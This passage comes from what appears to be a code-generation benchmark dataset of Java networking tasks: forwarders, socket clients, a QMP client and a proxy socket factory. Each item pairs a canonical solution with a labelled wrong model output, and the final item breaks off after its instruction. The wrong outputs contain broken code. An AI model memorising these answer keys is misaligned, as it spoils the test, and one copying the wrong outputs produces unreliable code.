    "wrong_result": "public class tcpConnection extends AsyncTask<String, Void, Void> {\n    private Activity activity;\n    private Context context;\n    private static final String TAG = \"tcpConnection\";\n    public static OutputStream out;\n\n    public tcpConnection(Activity activity, Context context) {\n        this.activity = activity;\n        this.context = context;\n    }\n\n    @Override\n    protected Void doInBackground(String... strings) {\n        String ip = strings[0];\n        int port = Integer.parseInt(strings[1]);\n\n        Socket socket = null;\n        boolean connected = false;\n\n        while (!connected) {\n            try {\n                socket = new Socket(ip, port);\n                connected = true;\n            } catch (IOException e) {\n                Log.e(TAG, \"Failed to connect: \" + e.getMessage());\n                try {\n                    Thread.sleep(2000);\n                } catch (InterruptedException ie) {\n                    Log.e(TAG, \"Interrupted while waiting to retry connection: \" + ie.getMessage());\n                }\n            }\n        }\n\n        try {\n            out = new ObjectOutputStream(socket.getOutputStream());\n            out.flush();\n\n            String deviceInfo = \"DeviceInfo: \" + Build.MODEL;\n            out.writeUTF(deviceInfo);\n            out.flush();\n\n            BufferedReader reader = new BufferedReader(new InputStreamReader(socket.getInputStream()));\n            String line;\n\n            while (true) {\n                try {\n                    line = reader.readLine();\n                    if (line == null) {\n                        Log.e(TAG, \"No response from server\");\n                        break;\n                    }\n                    if (line.equalsIgnoreCase(\"exit\")) {\n                        Log.d(TAG, \"Received exit command\");\n                        break;\n                    }\n                    out.writeUTF(\"Command processed: \" + line);\n                    out.flush();\n                } catch (IOException e) {\n                    Log.e(TAG, \"Error reading from server: \" + e.getMessage());\n                    socket.close();\n                    out = null;\n                    connected = false;\n                    break;\n                }\n            }\n\n            if (socket != null) {\n                socket.close();\n            }\n\n        } catch (IOException e) {\n            Log.e(TAG, \"Error in connection setup: \" + e.getMessage());\n        }\n\n        return null;\n    }\n}"
  },
  {
    "Task_id": 583,
    "Instruction": "Task Description: Create a Java class that handles network forwarding for both TCP and UDP protocols, managing connections and data transmission between clients and servers.\n\nClass Description: The NetworkForwarder class is responsible for forwarding network data to a specified destination server using either TCP or UDP protocols. It maintains UDP connections through a DatagramSocket and manages multiple TCP connections using a mapping of source addresses to Socket instances. The class provides methods for forwarding data and disconnecting specific TCP connections.\n\nAttributes:\n- LOGGER: Logger - Used for logging warnings and errors\n- destination: InetAddress - The destination address for forwarded data\n- connectionUdp: DatagramSocket - The UDP socket used for datagram communication\n- connectionsTcp: Map<InetSocketAddress, Socket> - A mapping of source addresses to their corresponding TCP Socket connections\n\nMethods:\n- NetworkForwarder(Config config) -> void - Constructor that initializes the destination address and UDP socket using configuration parameters\n- forward(InetSocketAddress source, int port, boolean datagram, byte[] data) -> void - Forwards data to the destination server using either TCP or UDP protocol based on the datagram parameter\n- disconnect(InetSocketAddress source) -> void - Closes and removes the TCP connection associated with the specified source address",
    "Canonical_solution": "import org.slf4j.Logger;\nimport org.slf4j.LoggerFactory;\nimport org.traccar.config.Config;\nimport org.traccar.config.Keys;\n\nimport jakarta.inject.Inject;\nimport jakarta.inject.Singleton;\nimport java.io.IOException;\nimport java.net.DatagramPacket;\nimport java.net.DatagramSocket;\nimport java.net.InetAddress;\nimport java.net.InetSocketAddress;\nimport java.net.Socket;\nimport java.util.HashMap;\nimport java.util.Map;\n\n@Singleton\npublic class NetworkForwarder {\n\n    private static final Logger LOGGER = LoggerFactory.getLogger(NetworkForwarder.class);\n\n    private final InetAddress destination;\n    private final DatagramSocket connectionUdp;\n    private final Map<InetSocketAddress, Socket> connectionsTcp = new HashMap<>();\n\n    @Inject\n    public NetworkForwarder(Config config) throws IOException {\n        destination = InetAddress.getByName(config.getString(Keys.SERVER_FORWARD));\n        connectionUdp = new DatagramSocket();\n    }\n\n    public void forward(InetSocketAddress source, int port, boolean datagram, byte[] data) {\n        try {\n            if (datagram) {\n                connectionUdp.send(new DatagramPacket(data, data.length, destination, port));\n            } else {\n                Socket connectionTcp = connectionsTcp.get(source);\n                if (connectionTcp == null || connectionTcp.isClosed()) {\n                    connectionTcp = new Socket(destination, port);\n                    connectionsTcp.put(source, connectionTcp);\n                }\n                connectionTcp.getOutputStream().write(data);\n            }\n        } catch (IOException e) {\n            LOGGER.warn(\"Network forwarding error\", e);\n        }\n    }\n\n    public void disconnect(InetSocketAddress source) {\n        Socket connectionTcp = connectionsTcp.remove(source);\n        if (connectionTcp != null) {\n            try {\n                connectionTcp.close();\n            } catch (IOException e) {\n                LOGGER.warn(\"Connection close error\", e);\n            }\n        }\n    }\n\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 1,
    "wrong_result": "```java\nimport java.net.*;\nimport java.io.*;\nimport java.util.*;\n\npublic class NetworkForwarder {\n    private final Logger LOGGER;\n    private final InetAddress destination;\n    private DatagramSocket connectionUdp;\n    private final Map<InetSocketAddress, Socket> connectionsTcp;\n\n    public NetworkForwarder(Config config) {\n        this.destination = config.getDestinationAddress();\n        this.connectionUdp = new DatagramSocket(config.getUdpPort());\n        this.connectionsTcp = new HashMap<>();\n        this.LOGGER = Logger.getLogger(NetworkForwarder.class.getName());\n    }\n\n    public void forward(InetSocketAddress source, int port, boolean datagram, byte[] data) {\n        if (datagram) {\n            try {\n                DatagramPacket packet = new DatagramPacket(data, data.length, destination, config.getDestinationPort());\n                connectionUdp.send(packet);\n            } catch (IOException e) {\n                LOGGER.severe(\"Error sending UDP data: \" + e.getMessage());\n            }\n        } else {\n            Socket socket = connectionsTcp.get(source);\n            if (socket != null) {\n                try (OutputStream out = socket.getOutputStream()) {\n                    out.write(data);\n                } catch (IOException e) {\n                    LOGGER.severe(\"Error sending TCP data: \" + e.getMessage());\n                }\n            } else {\n                LOGGER.warning(\"No TCP connection found for source: \" + source);\n            }\n        }\n    }\n\n    public void disconnect(InetSocketAddress source) {\n        Socket socket = connectionsTcp.remove(source);\n        if (socket != null) {\n            try {\n                socket.close();\n            } catch (IOException e) {\n                LOGGER.severe(\"Error closing TCP connection: \" + e.getMessage());\n            }\n        }\n    }\n}\n```"
  },
  {
    "Task_id": 584,
    "Instruction": "Task Description: Create a Java class that implements a TCP socket client for communication with a server, including connection management and data transmission capabilities.\n\nClass Description: MocoSocketHelper is a TCP socket client implementation that handles connection to a server, sending data, and receiving responses. It implements Closeable for proper resource cleanup.\n\nAttributes:\n- socket: Socket - The underlying socket connection to the server\n- address: SocketAddress - The server address (host and port) to connect to\n- os: PrintStream - Output stream for sending data to the server\n- reader: BufferedReader - Input stream for reading responses from the server\n\nMethods:\n- MocoSocketHelper(String target, int port) -> void - Constructor that initializes the socket and address with target host and port\n- connect() -> void - Establishes connection to the server and initializes I/O streams\n- send(String request) -> String - Sends a request string to server and returns the response line\n- send(String request, int readCount) -> String - Sends a request string and reads specified number of characters from response\n- close() -> void - Closes the socket connection (inherited from Closeable interface)",
    "Canonical_solution": "import java.io.BufferedReader;\nimport java.io.Closeable;\nimport java.io.IOException;\nimport java.io.InputStreamReader;\nimport java.io.OutputStream;\nimport java.io.PrintStream;\nimport java.net.InetSocketAddress;\nimport java.net.Socket;\nimport java.net.SocketAddress;\nimport java.util.concurrent.TimeUnit;\n\npublic class MocoSocketHelper implements Closeable {\n    private Socket socket;\n    private SocketAddress address;\n    private PrintStream os;\n    private BufferedReader reader;\n\n    public MocoSocketHelper(final String target, final int port) {\n        socket = new Socket();\n        address = new InetSocketAddress(target, port);\n    }\n\n    public void connect() {\n        try {\n            socket.connect(address);\n            socket.setSoTimeout((int) TimeUnit.SECONDS.toMillis(1));\n            OutputStream outputStream = this.socket.getOutputStream();\n            this.os = new PrintStream(outputStream);\n            this.reader = new BufferedReader(new InputStreamReader(this.socket.getInputStream()));\n        } catch (IOException e) {\n            throw new RuntimeException(e);\n        }\n    }\n\n    public String send(final String request) {\n        os.print(request);\n        os.flush();\n\n        try {\n            return reader.readLine();\n        } catch (IOException e) {\n            throw new RuntimeException(e);\n        }\n    }\n\n    public String send(final String request, final int readCount) {\n        os.print(request);\n        os.flush();\n\n        try {\n            char[] buffer = new char[readCount];\n            reader.read(buffer);\n            return new String(buffer);\n        } catch (IOException e) {\n            throw new RuntimeException(e);\n        }\n    }\n\n    @Override\n    public void close() throws IOException {\n        this.socket.close();\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 1,
    "wrong_result": "public class MocoSocketHelper implements Closeable {\n    private Socket socket;\n    private SocketAddress address;\n    private PrintStream os;\n    private BufferedReader reader;\n\n    public MocoSocketHelper(String target, int port) {\n        try {\n            InetAddress inetAddress = InetAddress.getByName(target);\n            this.address = new InetSocketAddress(inetAddress, port);\n            this.socket = new Socket();\n        } catch (Exception e) {\n            // Handle exception\n        }\n    }\n\n    public void connect() throws IOException {\n        socket.connect(address);\n        os = new PrintStream(socket.getOutputStream());\n        reader = new BufferedReader(new InputStreamReader(socket.getInputStream()));\n    }\n\n    public String send(String request) throws IOException {\n        os.println(request);\n        return reader.readLine();\n    }\n\n    public String send(String request, int readCount) throws IOException {\n        os.println(request);\n        StringBuilder sb = new StringBuilder();\n        char[] buffer = new char[readCount];\n        int read;\n        while ((read = reader.read(buffer, 0, readCount)) != -1) {\n            sb.append(buffer, 0, read);\n            if (sb.length() >= readCount) {\n                break;\n            }\n        }\n        return sb.toString();\n    }\n\n    public void close() throws IOException {\n        if (socket != null) {\n            socket.close();\n        }\n    }\n}"
  },
  {
    "Task_id": 585,
    "Instruction": "Task Description: Create a class that handles both Bluetooth and TCP socket communication for a Pebble device, allowing data transmission and reception through either protocol based on the device address format.\n\nClass Description: The PebbleIoThread class manages connections and data transfer to a Pebble device using either Bluetooth or TCP sockets. It automatically detects the protocol based on the device address format (TCP if address contains one colon, Bluetooth if multiple colons).\n\nAttributes:\n- mIsTCP: [boolean] - Flag indicating whether TCP mode is active\n- mBtAdapter: [BluetoothAdapter] - Android Bluetooth adapter instance\n- mBtSocket: [BluetoothSocket] - Bluetooth socket for communication\n- mTCPSocket: [Socket] - TCP socket for communication\n- mInStream: [InputStream] - Input stream for receiving data\n- mOutStream: [OutputStream] - Output stream for sending data\n- mContext: [Context] - Android application context\n- gbDevice: [GBDevice] - Device information object\n\nMethods:\n- connect(): [boolean] - Establishes connection with the device (returns true if successful)\n  Input: None\n  Output: boolean - Connection success status\n  \n- write_real(byte[] bytes): [void] - Sends data to the connected device with protocol-specific framing\n  Input: byte[] - Data bytes to send\n  Output: None\n  \n- quit(): [void] - Closes all active connections and releases resources\n  Input: None\n  Output: None",
    "Canonical_solution": "import android.bluetooth.BluetoothAdapter;\nimport android.bluetooth.BluetoothDevice;\nimport android.bluetooth.BluetoothSocket;\nimport android.content.Context;\nimport java.io.IOException;\nimport java.io.InputStream;\nimport java.io.OutputStream;\nimport java.net.InetAddress;\nimport java.net.Socket;\nimport java.util.UUID;\n\nclass PebbleIoThread {\n\n    private boolean mIsTCP = false;\n    private BluetoothAdapter mBtAdapter;\n    private BluetoothSocket mBtSocket;\n    private Socket mTCPSocket;\n    private InputStream mInStream;\n    private OutputStream mOutStream;\n    private Context mContext;\n    private GBDevice gbDevice;\n\n    PebbleIoThread(Context context, GBDevice device, BluetoothAdapter btAdapter) {\n        mContext = context;\n        gbDevice = device;\n        mBtAdapter = btAdapter;\n    }\n\n    protected boolean connect() {\n        String deviceAddress = gbDevice.getAddress();\n        try {\n            int firstColon = deviceAddress.indexOf(\":\");\n            if (firstColon == deviceAddress.lastIndexOf(\":\")) {\n                mIsTCP = true;\n                InetAddress serverAddr = InetAddress.getByName(deviceAddress.substring(0, firstColon));\n                mTCPSocket = new Socket(serverAddr, Integer.parseInt(deviceAddress.substring(firstColon + 1)));\n                mInStream = mTCPSocket.getInputStream();\n                mOutStream = mTCPSocket.getOutputStream();\n            } else {\n                mIsTCP = false;\n                BluetoothDevice btDevice = mBtAdapter.getRemoteDevice(deviceAddress);\n                final UUID UuidSDP = UUID.fromString(\"00001101-0000-1000-8000-00805f9b34fb\");\n                mBtSocket = btDevice.createRfcommSocketToServiceRecord(UuidSDP);\n                mBtSocket.connect();\n                mInStream = mBtSocket.getInputStream();\n                mOutStream = mBtSocket.getOutputStream();\n            }\n            return true;\n        } catch (IOException e) {\n            mInStream = null;\n            mOutStream = null;\n            mBtSocket = null;\n            return false;\n        }\n    }\n\n    private void write_real(byte[] bytes) {\n        try {\n            if (mIsTCP) {\n                ByteBuffer buf = ByteBuffer.allocate(bytes.length + 8);\n                buf.order(ByteOrder.BIG_ENDIAN);\n                buf.putShort((short) 0xfeed);\n                buf.putShort((short) 1);\n                buf.putShort((short) bytes.length);\n                buf.put(bytes);\n                buf.putShort((short) 0xbeef);\n                mOutStream.write(buf.array());\n                mOutStream.flush();\n            } else {\n                mOutStream.write(bytes);\n                mOutStream.flush();\n            }\n        } catch (IOException e) {\n            // Error handling\n        }\n    }\n\n    public void quit() {\n        if (mBtSocket != null) {\n            try {\n                mBtSocket.close();\n            } catch (IOException ignored) {\n            }\n            mBtSocket = null;\n        }\n        if (mTCPSocket != null) {\n            try {\n                mTCPSocket.close();\n            } catch (IOException ignored) {\n            }\n            mTCPSocket = null;\n        }\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 1,
    "wrong_result": "public class PebbleIoThread { private boolean mIsTCP; private BluetoothAdapter mBtAdapter; private BluetoothSocket mBtSocket; private Socket mTCPSocket; private InputStream mInStream; private OutputStream mOutStream; private Context mContext; private GBDevice gbDevice; public PebbleIoThread(Context context, GBDevice device, String address) { mContext = context; gbDevice = device; mBtAdapter = BluetoothAdapter.getDefaultAdapter(); mIsTCP = false; int colonCount = 0; for (char c : address.toCharArray()) { if (c == ':') colonCount++; } if (colonCount == 1) { mIsTCP = true; } else { mIsTCP = false; } if (mIsTCP) { String[] parts = address.split(\":\"); String ip = parts[0]; int port = Integer.parseInt(parts[1]); try { mTCPSocket = new Socket(InetAddress.getByName(ip), port); mInStream = mTCPSocket.getInputStream(); mOutStream = mTCPSocket.getOutputStream(); } catch (IOException e) { } } else { BluetoothDevice device = mBtAdapter.getRemoteDevice(address); try { mBtSocket = device.createRfcommChannel(1); mBtSocket.connect(); mInStream = mBtSocket.getInputStream(); mOutStream = mBtSocket.getOutputStream(); } catch (IOException e) { } } } public boolean connect() { if (mIsTCP) { try { mTCPSocket.connect(); mInStream = mTCPSocket.getInputStream(); mOutStream = mTCPSocket.getOutputStream(); return true; } catch (IOException e) { return false; } } else { try { mBtSocket.connect(); mInStream = mBtSocket.getInputStream(); mOutStream = mBtSocket.getOutputStream(); return true; } catch (IOException e) { return false; } } } public void write_real(byte[] bytes) { if (mIsTCP) { try { mOutStream.write(bytes); } catch (IOException e) { } } else { try { mOutStream.write(bytes); } catch (IOException e) { } } } public void quit() { if (mIsTCP) { try { if (mTCPSocket != null) mTCPSocket.close(); } catch (IOException e) { } } else { try { if (mBtSocket != null) mBtSocket.close(); } catch (IOException e) { } } } }"
  },
  {
    "Task_id": 586,
    "Instruction": "Task Description: Implement a QMP (QEMU Machine Protocol) client class that can communicate with a QEMU instance either through a local Unix domain socket or a TCP socket, depending on configuration. The client should be able to send commands and receive responses from the QEMU monitor interface.\n\nClass Description: The QmpClient class provides functionality to connect to a QEMU instance via QMP protocol, send commands, and receive responses. It supports both local Unix domain sockets (for local QEMU instances) and TCP sockets (for remote QEMU instances). The class handles connection establishment, command sending, response parsing, and resource cleanup.\n\nAttributes:\n- TAG: String - A constant for logging purposes\n- requestCommandMode: String - The initial QMP capabilities request command\n- external: boolean - Flag indicating whether to use external TCP connection (true) or local Unix socket (false)\n\nMethods:\n- setExternal(boolean value) -> void - Sets the connection mode (TCP socket or local Unix socket)\n- sendCommand(String command) -> String - Sends a QMP command and returns the response\n- tryGetResponse(BufferedReader in) -> String - Attempts to get a response with retries\n- sendRequest(PrintWriter out, String request) -> void - Sends a request to the QEMU monitor\n- getResponse(BufferedReader in) -> String - Reads and parses the response from QEMU monitor",
    "Canonical_solution": "import android.net.LocalSocket;\nimport android.net.LocalSocketAddress;\nimport android.util.Log;\n\nimport com.max2idea.android.limbo.main.Config;\nimport com.max2idea.android.limbo.main.LimboApplication;\n\nimport org.json.JSONObject;\n\nimport java.io.BufferedReader;\nimport java.io.IOException;\nimport java.io.InputStreamReader;\nimport java.io.PrintWriter;\nimport java.net.Socket;\n\npublic class QmpClient {\n\n    private static final String TAG = \"QmpClient\";\n    private static final String requestCommandMode = \"{ \\\"execute\\\": \\\"qmp_capabilities\\\" }\";\n    private static boolean external = false;\n\n    public static void setExternal(boolean value) {\n        external = value;\n    }\n\n    public synchronized static String sendCommand(String command) {\n        String response = null;\n        Socket pingSocket = null;\n        LocalSocket localSocket = null;\n        PrintWriter out = null;\n        BufferedReader in = null;\n\n        try {\n            if(external) {\n                pingSocket = new Socket(Config.QMPServer, Config.QMPPort);\n                pingSocket.setSoTimeout(5000);\n                out = new PrintWriter(pingSocket.getOutputStream(), true);\n                in = new BufferedReader(new InputStreamReader(pingSocket.getInputStream()));\n            } else {\n                localSocket = new LocalSocket();\n                String localQMPSocketPath = LimboApplication.getLocalQMPSocketPath();\n                LocalSocketAddress localSocketAddr = new LocalSocketAddress(localQMPSocketPath, LocalSocketAddress.Namespace.FILESYSTEM);\n                localSocket.connect(localSocketAddr);\n                localSocket.setSoTimeout(5000);\n                out = new PrintWriter(localSocket.getOutputStream(), true);\n                in = new BufferedReader(new InputStreamReader(localSocket.getInputStream()));\n            }\n            sendRequest(out, QmpClient.requestCommandMode);\n            response = tryGetResponse(in);\n            sendRequest(out, command);\n            response = tryGetResponse(in);\n        } catch (Exception e) {\n            e.printStackTrace();\n        } finally {\n            if (out != null)\n                out.close();\n            try {\n                if (in != null)\n                    in.close();\n                if (pingSocket != null)\n                    pingSocket.close();\n            } catch (IOException e) {\n                e.printStackTrace();\n            }\n        }\n        if(Config.debugQmp)\n            Log.d(TAG, \"Response: \" + response);\n        return response;\n    }\n\n    private static String tryGetResponse(BufferedReader in) throws Exception {\n        String response = null;\n        int trial = 0;\n        while((response = getResponse(in)).equals(\"\") && trial < 3){\n            Thread.sleep(1000);\n            trial++;\n        }\n        return response;\n    }\n\n    private static void sendRequest(PrintWriter out, String request) {\n        if(Config.debugQmp)\n            Log.d(TAG, \"QMP request\" + request);\n        out.println(request);\n    }\n\n    private static String getResponse(BufferedReader in) throws Exception {\n        String line;\n        StringBuilder stringBuilder = new StringBuilder(\"\");\n        try {\n            do {\n                line = in.readLine();\n                if (line != null) {\n                    if(Config.debugQmp)\n                        Log.d(TAG, \"QMP response: \" + line);\n                    JSONObject object = new JSONObject(line);\n                    String returnStr = null;\n                    String errStr = null;\n\n                    try {\n                        if(line.contains(\"return\"))\n                            returnStr = object.getString(\"return\");\n                    } catch (Exception ex) {\n                        if(Config.debugQmp)\n                            ex.printStackTrace();\n                    }\n\n                    if (returnStr != null) {\n                        stringBuilder.append(line);\n                        stringBuilder.append(\"\\n\");\n                        break;\n                    }\n\n                    try {\n                        if(line.contains(\"error\"))\n                            errStr = object.getString(\"error\");\n                    } catch (Exception ex) {\n                        if(Config.debugQmp)\n                            ex.printStackTrace();\n                    }\n                    stringBuilder.append(line);\n                    stringBuilder.append(\"\\n\");\n                    if (errStr != null) {\n                        break;\n                    }\n                } else\n                    break;\n            } while (true);\n        } catch (Exception ex) {\n            Log.e(TAG, \"Could not get Response: \" + ex.getMessage());\n            if(Config.debugQmp)\n                ex.printStackTrace();\n        }\n        return stringBuilder.toString();\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 1,
    "wrong_result": "public class QmpClient {\n    private static final String TAG = \"QMPClient\";\n    private String requestCommandMode = \"qmp_capabilities\";\n    private boolean external;\n    private PrintWriter out;\n    private BufferedReader in;\n\n    public QmpClient(boolean external) {\n        this.external = external;\n        try {\n            if (external) {\n                Socket socket = new Socket(\"localhost\", 4444);\n                out = new PrintWriter(socket.getOutputStream(), true);\n                in = new BufferedReader(new InputStreamReader(socket.getInputStream()));\n            } else {\n                Socket socket = new Socket();\n                socket.connect(new InetSocketAddress(\"unix://path/to/socket\"));\n                out = new PrintWriter(socket.getOutputStream(), true);\n                in = new BufferedReader(new InputStreamReader(socket.getInputStream()));\n            }\n        } catch (IOException e) {\n            e.printStackTrace();\n        }\n    }\n\n    public void setExternal(boolean value) {\n        this.external = value;\n        try {\n            if (external) {\n                Socket socket = new Socket(\"localhost\", 4444);\n                out = new PrintWriter(socket.getOutputStream(), true);\n                in = new BufferedReader(new InputStreamReader(socket.getInputStream()));\n            } else {\n                Socket socket = new Socket();\n                socket.connect(new InetSocketAddress(\"unix://path/to/socket\"));\n                out = new PrintWriter(socket.getOutputStream(), true);\n                in = new BufferedReader(new InputStreamReader(socket.getInputStream()));\n            }\n        } catch (IOException e) {\n            e.printStackTrace();\n        }\n    }\n\n    public String sendCommand(String command) {\n        sendRequest(out, command);\n        return tryGetResponse(in);\n    }\n\n    private String tryGetResponse(BufferedReader in) {\n        int retryCount = 0;\n        String response = null;\n        while (retryCount < 3) {\n            try {\n                response = getResponse(in);\n                if (response != null && !response.trim().isEmpty()) {\n                    return response;\n                }\n            } catch (Exception e) {\n                retryCount++;\n            }\n        }\n        return null;\n    }\n\n    private void sendRequest(PrintWriter out, String request) {\n        out.println(request);\n    }\n\n    private String getResponse(BufferedReader in) throws IOException {\n        StringBuilder response = new StringBuilder();\n        String line;\n        while ((line = in.readLine()) != null) {\n            if (line.trim().isEmpty()) {\n                continue;\n            }\n            response.append(line).append(\"\\n\");\n            if (line.contains(\"}\")) {\n                break;\n            }\n        }\n        return response.toString();\n    }\n}"
  },
  {
    "Task_id": 587,
    "Instruction": "Task Description: Implement a TCP-based unicast communication class that enables message exchange between a client and server, supporting both sending and receiving of messages with proper resource management.\n\nClass Description: UnicastTestTcp is a class that establishes TCP connections for unicast communication between two endpoints. It acts as both a client (connecting to a remote server) and a server (accepting connections from remote clients). The class handles message serialization/deserialization and provides thread-safe operations for sending messages.\n\nAttributes:\n- local: InetSocketAddress - The local address and port for server socket binding\n- remote: InetSocketAddress - The remote address and port for client connection\n- sock: Socket - The client socket for outgoing connections\n- output: DataOutputStream - The output stream for sending data to the remote endpoint\n- output_lock: Lock - A reentrant lock for thread-safe output operations\n- srv_sock: ServerSocket - The server socket for accepting incoming connections\n- acceptor: Acceptor - A thread that handles incoming connections\n\nMethods:\n- init(String local_addr, String remote_addr, int local_port, int remote_port) -> void - Initializes the communication by setting up both server and client sockets. Throws Exception if initialization fails.\n- writeMessage(Message msg, DataOutputStream out) -> static void - Serializes and writes a message to the output stream. Throws Exception if writing fails.\n- readMessage(DataInput in) -> static Message - Reads and deserializes a message from the input stream. Throws Exception if reading fails.\n- receive(Message msg) -> void - Processes received messages based on their type (START or DATA)\n\nNested Class:\n- Acceptor: Thread - Handles incoming connections and message processing\n  Methods:\n  - run() -> void - Continuously accepts new connections and processes incoming messages\n  - handleRequest(DataInputStream in) -> void - Reads and processes individual messages from an established connection. Throws Exception if processing fails.",
    "Canonical_solution": "import org.jgroups.*;\nimport org.jgroups.stack.IpAddress;\nimport org.jgroups.util.DefaultSocketFactory;\nimport org.jgroups.util.Util;\n\nimport java.io.*;\nimport java.net.InetSocketAddress;\nimport java.net.ServerSocket;\nimport java.net.Socket;\nimport java.nio.ByteBuffer;\nimport java.util.concurrent.atomic.AtomicLong;\nimport java.util.concurrent.locks.Lock;\nimport java.util.concurrent.locks.ReentrantLock;\n\npublic class UnicastTestTcp {\n    protected InetSocketAddress local, remote;\n    protected Socket sock;\n    protected DataOutputStream output;\n    protected final Lock output_lock = new ReentrantLock();\n    protected ServerSocket srv_sock;\n    protected Acceptor acceptor;\n\n    protected static final boolean TCP_NODELAY = false;\n    protected static final int SOCK_SEND_BUF_SIZE = 200 * 1000;\n    protected static final int SOCK_RECV_BUF_SIZE = 200 * 1000;\n    protected static final byte START = 1;\n    protected static final byte DATA = 2;\n\n    public void init(String local_addr, String remote_addr, int local_port, int remote_port) throws Exception {\n        local = new InetSocketAddress(local_addr, local_port);\n        remote = new InetSocketAddress(remote_addr, remote_port);\n        srv_sock = Util.createServerSocket(new DefaultSocketFactory(), \"server\", local.getAddress(),\n                                         local.getPort(), local.getPort(), 0);\n        System.out.println(\"Listening on \" + srv_sock.getLocalSocketAddress());\n        acceptor = new Acceptor();\n        acceptor.start();\n\n        sock = new Socket();\n        sock.setSendBufferSize(SOCK_SEND_BUF_SIZE);\n        sock.setReceiveBufferSize(SOCK_RECV_BUF_SIZE);\n        try {\n            sock.connect(remote);\n            output = new DataOutputStream(new BufferedOutputStream(sock.getOutputStream()));\n            System.out.println(\"Connected to \" + sock.getRemoteSocketAddress());\n        }\n        catch(Throwable t) {\n            System.out.println(\"Failed connecting to \" + remote + \": will only act as server\");\n        }\n    }\n\n    protected static final void writeMessage(final Message msg, DataOutputStream out) throws Exception {\n        byte flags = 0;\n        if(msg.getDest() == null)\n            flags += (byte)2;\n        out.writeShort(Version.version);\n        out.writeByte(flags);\n        msg.writeTo(out);\n    }\n\n    protected static final Message readMessage(DataInput in) throws Exception {\n        short ver = in.readShort();\n        byte flags = in.readByte();\n        Message msg = new BytesMessage();\n        msg.readFrom(in);\n        return msg;\n    }\n\n    protected class Acceptor extends Thread {\n        public void run() {\n            while(!srv_sock.isClosed()) {\n                Socket client_sock = null;\n                DataInputStream in = null;\n                try {\n                    client_sock = srv_sock.accept();\n                    client_sock.setTcpNoDelay(TCP_NODELAY);\n                    client_sock.setReceiveBufferSize(SOCK_RECV_BUF_SIZE);\n                    client_sock.setSendBufferSize(SOCK_SEND_BUF_SIZE);\n                    in = new DataInputStream(new BufferedInputStream(client_sock.getInputStream()));\n                    while(!client_sock.isClosed())\n                        handleRequest(in);\n                }\n                catch(Exception e) {\n                    Util.close(client_sock);\n                    Util.close(in);\n                }\n            }\n        }\n\n        protected void handleRequest(DataInputStream in) throws Exception {\n            Message msg = readMessage(in);\n            receive(msg);\n        }\n    }\n\n    public void receive(Message msg) {\n        byte[] buf = msg.getArray();\n        byte type = buf[msg.getOffset()];\n\n        switch(type) {\n            case START:\n                ByteBuffer tmp = ByteBuffer.wrap(buf, 1+msg.getOffset(), Global.LONG_SIZE);\n                int num_msgs = (int)tmp.getLong();\n                System.out.println(\"Received START message with \" + num_msgs + \" messages\");\n                break;\n            case DATA:\n                System.out.println(\"Received DATA message\");\n                break;\n            default:\n                System.err.println(\"Type \" + type + \" is invalid\");\n        }\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 1,
    "wrong_result": "public class UnicastTestTcp {\n    private InetSocketAddress local;\n    private InetSocketAddress remote;\n    private Socket sock;\n    private DataOutputStream output;\n    private Lock output_lock;\n    private ServerSocket srv_sock;\n    private Thread acceptor;\n\n    private static class Acceptor extends Thread {\n        private UnicastTestTcp parent;\n\n        public Acceptor(UnicastTestTcp parent) {\n            this.parent = parent;\n        }\n\n        @Override\n        public void run() {\n            try {\n                while (true) {\n                    Socket client = parent.srv_sock.accept();\n                    DataInputStream input = new DataInputStream(client.getInputStream());\n                    parent.handleRequest(input);\n                }\n            } catch (IOException e) {\n                e.printStackTrace();\n            }\n        }\n\n        private void handleRequest(DataInputStream in) throws IOException {\n            while (true) {\n                try {\n                    Message msg = UnicastTestTcp.readMessage(in);\n                    parent.receive(msg);\n                } catch (Exception e) {\n                    e.printStackTrace();\n                    break;\n                }\n            }\n        }\n    }\n\n    public void init(String local_addr, String remote_addr, int local_port, int remote_port) throws Exception {\n        local = new InetSocketAddress(local_addr, local_port);\n        remote = new InetSocketAddress(remote_addr, remote_port);\n\n        srv_sock = new ServerSocket();\n        srv_sock.bind(local);\n\n        acceptor = new Acceptor(this);\n        acceptor.start();\n\n        sock = new Socket();\n        sock.connect(remote);\n        output = new DataOutputStream(sock.getOutputStream());\n        output_lock = new ReentrantLock();\n    }\n\n    public static void writeMessage(Message msg, DataOutputStream out) throws Exception {\n        ObjectOutputStream oos = new ObjectOutputStream(out);\n        oos.writeObject(msg);\n        oos.flush();\n    }\n\n    public static Message readMessage(DataInputStream in) throws Exception {\n        ObjectInputStream ois = new ObjectInputStream(in);\n        return (Message) ois.readObject();\n    }\n\n    public void receive(Message msg) {\n        if (msg.type == Message.START) {\n            // Handle START message\n        } else if (msg.type == Message.DATA) {\n            // Handle DATA message\n        }\n    }\n}"
  },
  {
    "Task_id": 589,
    "Instruction": "Task Description: Create a custom SocketFactory implementation that supports both direct connections and proxy connections (SOCKS and HTTP) with optional authentication for HTTP proxies.\n\nClass Description: CustomSocketFactory is a SocketFactory subclass that provides socket creation capabilities with proxy support. It handles both direct connections and connections through SOCKS or HTTP proxies, including HTTP proxy authentication when required.\n\nAttributes:\n- proxyHost: String - The hostname or IP address of the proxy server\n- proxyPort: int - The port number of the proxy server\n- proxyUser: String - The username for proxy authentication (optional)\n- proxyPass: String - The password for proxy authentication (optional)\n- proxyType: Proxy.Type - The type of proxy (SOCKS or HTTP)\n\nMethods:\n- createSocket(String host, int port) -> Socket - Creates a socket connected to the specified host and port\n- createSocket(String host, int port, InetAddress localHost, int localPort) -> Socket - Creates a socket connected to the specified host and port, binding to the specified local address and port\n- createSocket(InetAddress host, int port) -> Socket - Creates a socket connected to the specified InetAddress and port\n- createSocket(InetAddress address, int port, InetAddress localAddress, int localPort) -> Socket - Creates a socket connected to the specified InetAddress and port, binding to the specified local address and port\n- createSocket() -> Socket - Creates an unconnected socket with proxy configuration\n- connectToProxy(Socket socket) -> void - Handles HTTP proxy connection and authentication (private method)\n- getBasicAuthStr() -> String - Generates Base64 encoded proxy authentication string (private method)\n- readLine(InputStream in) -> String - Reads a line from the input stream (private method)\n- getResponseCode(String statusLine) -> int - Extracts HTTP response code from status line (private static method)",
